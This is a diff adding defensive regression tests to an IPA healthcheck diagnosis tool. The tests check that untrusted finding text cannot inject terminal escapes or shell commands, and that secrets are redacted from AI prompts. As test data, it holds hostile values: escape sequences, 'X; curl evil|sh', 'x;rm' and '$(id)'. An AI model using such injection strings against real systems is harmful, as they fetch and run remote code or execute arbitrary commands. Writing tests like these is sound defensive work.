@@ -58,3 +58,72 @@ def test_claimed_findings_are_not_duplicated(tmp_path):
     claimed_ids = {r.evidence_id for d in first for r in d.evidence_for}
     assert claimed_ids
     assert unexplained.unexplained_finding_diagnoses(bundle, first) == []
+
+
+# ---- security-review regressions (untrusted ipa-healthcheck text) ----------
+
+import io
+import json as _json
+
+from rich.console import Console
+
+from ipa_diagnose.engine.model import Confidence  # noqa: F401  (import side-effect free)
+from ipa_diagnose.evidence.healthcheck import parse_healthcheck_results
+from ipa_diagnose.evidence.model import EvidenceBundle
+from ipa_diagnose.privacy.minimize import build_ai_payload
+from ipa_diagnose.render.console import render_report
+
+
+def _bundle_from(entries):
+    findings = parse_healthcheck_results(entries, command="test", live=False)
+    return EvidenceBundle(hostname="h", collected_at=EvidenceBundle.now(), findings=findings)
+
+
+def _entry(source, check, result, msg):
+    return {"source": source, "check": check, "result": result, "uuid": "u", "kw": {"msg": msg}}
+
+
+def _render(report):
+    buf = io.StringIO()
+    render_report(report, Console(file=buf, width=120, force_terminal=False, highlight=False), details=True)
+    return buf.getvalue()
+
+
+def test_hostile_finding_text_cannot_crash_render_or_inject_terminal_escapes():
+    hostile = "\x1b]0;pwn\x07\x1b[2J [/nonsense] [link=http://evil]click[/link] ‮ boom"
+    report = run_diagnosis(_bundle_from([_entry("ipahealthcheck.future.x", "Chk", "CRITICAL", hostile)]))
+    out = _render(report)  # must not raise rich.errors.MarkupError
+    assert "\x1b" not in out and "‮" not in out
+    assert "boom" in out
+
+
+def test_hostile_check_or_source_never_reaches_the_displayed_command():
+    report = run_diagnosis(_bundle_from([_entry("ipahealthcheck.x", "X; curl evil|sh", "ERROR", "boom")]))
+    d = next(d for d in report.diagnoses if d.rule_id == "unexplained-findings")
+    assert d.next_diagnostic_step == "ipa-healthcheck --failures-only"
+    assert all("curl" not in (a.command or "") and ";" not in (a.command or "") for a in d.actions)
+
+
+def test_hostile_service_name_is_not_treated_as_a_service_and_never_reaches_a_command():
+    for bad in ("-H: not running", "a b: not running", "x;rm: not running", "$(id): not running"):
+        report = run_diagnosis(_bundle_from([_entry("ipahealthcheck.meta.services", "svc", "ERROR", bad)]))
+        for d in report.diagnoses:
+            for a in d.actions:
+                assert "rm" not in (a.command or "").split() and "$(" not in (a.command or "")
+        assert not any(d.rule_id.startswith("service-not-running") for d in report.diagnoses), bad
+
+
+def test_service_command_is_read_only_and_uses_option_terminator():
+    report = run_diagnosis(_bundle_from([_entry("ipahealthcheck.meta.services", "dirsrv", "ERROR", "dirsrv: not running")]))
+    cmd = next(d for d in report.diagnoses if "dirsrv" in d.title).actions[0].command
+    assert "-- dirsrv" in cmd and "restart" not in cmd and "start " not in cmd.split(";")[0]
+
+
+def test_ai_payload_redacts_secrets_embedded_in_diagnosis_text():
+    secret = "sk-abcdefghijklmnopqrstuvwx"
+    bundle = _bundle_from([_entry("ipahealthcheck.future.x", "Chk", "CRITICAL", f"token {secret} leaked")])
+    report = run_diagnosis(bundle)
+    d = next(d for d in report.diagnoses if d.rule_id == "unexplained-findings")
+    payload = build_ai_payload(bundle, d)
+    assert secret not in payload.user_prompt
+    assert payload.redaction_matches
